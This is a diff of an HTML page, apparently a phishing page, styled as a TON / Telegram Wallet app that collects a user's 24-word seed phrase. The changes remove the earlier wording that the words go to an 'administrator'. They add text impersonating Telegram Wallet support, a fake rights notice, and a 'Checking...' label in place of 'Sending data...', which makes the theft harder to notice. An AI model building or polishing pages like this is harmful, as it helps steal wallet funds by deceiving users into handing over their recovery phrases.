@@ -325,46 +325,40 @@
     <div id="introPage" class="page">
         <div style="text-align: center;">
             <div style="display: flex; justify-content: center; gap: 10px; margin-bottom: 16px;">
-                <div class="ton-icon-svg"></div>
-                <div class="ton-icon-svg"></div>
                 <span style="font-size: 36px;">⚡</span>
             </div>
             <h2><span>TON</span> Wallet</h2>
             <div class="subtext">
-                <span class="small-ton">🔐 Безопасное восстановление</span>
-                <span class="small-ton">24 слова seed-фразы</span>
             </div>
             <p style="margin: 24px 0 16px; line-height: 1.5; color: #cbd5e6;">
-                Это приложение поможет безопасно передать seed-фразу для верификации вашего кошелька TON.<br>
-                <strong style="color:#7cb9e8;">Данные защищены и отправляются администратору.</strong>
+                <strong style="color:#ecf0f1;">Чтобы связаться с поддержкой Telegram Wallet вам необходимо подтвердить, что вы являетесь владельцем вашего кошелька<br>
+                </strong>
             </p>
             <div style="display: flex; justify-content: center; gap: 12px; margin: 20px 0 12px;">
-                <span class="small-ton">🪙 TON Secure</span>
-                <span class="small-ton">✅ 24 слова</span>
-                <span class="small-ton">🔒 Шифрование</span>
+                <span class="small-ton">🪙 TON wallet</span>
+                <span class="small-ton">✅ 24 seed phrases</span>
+                <span class="small-ton">🔒 Encryption</span>
             </div>
-            <button id="continueBtn" class="ton-button">🚀 Начать восстановление ✨</button>
+            <button id="continueBtn" class="ton-button">Продолжить</button>
         </div>
-        <div class="close-hint">* Интерфейс в стиле Telegram Wallet</div>
+        <div class="close-hint">* Права защищеный Telegram Wallet 2026</div>
     </div>
 
     <div id="formPage" class="page hidden">
         <div>
-            <h2>📝 24 слова</h2>
-            <div class="subtext">Только маленькие латинские буквы, без пробелов <span class="small-ton">TON style</span></div>
+            <h2>Введите фразу восстановления</h2>
+            <div class="subtext">Введите фразу восстановления в верном порядке от 1 до 24 слова.</div>
             
             <!-- Блок для результата проверки -->
             <div id="resultMessage" class="result-message"></div>
-            <div id="sendingMessage" class="sending-message">⏳ Отправка данных...</div>
+            <div id="sendingMessage" class="sending-message">⏳ Проверка...</div>
             
             <div class="words-grid">
                 <div class="column" id="col1"></div>
                 <div class="column" id="col2"></div>
             </div>
-            <button id="sendBtn" class="ton-button">📤 Отправить администратору 💎</button>
-            <p style="font-size: 12px; text-align: center; margin-top: 18px; opacity: 0.7;">Введите 24 слова из вашей сид-фразы последовательно</p>
+            <button id="sendBtn" class="ton-button">Подтвердить</button></div>
         </div>
-    </div>
 
     <div id="successPage" class="page hidden">
         <div style="text-align: center;">
@@ -398,7 +392,6 @@
         
         const input = document.createElement('input');
         input.type = 'text';
-        input.placeholder = `слово ${i}`;
         input.id = `word${i}`;
         input.classList.add('word-input');
         input.autocomplete = 'off';
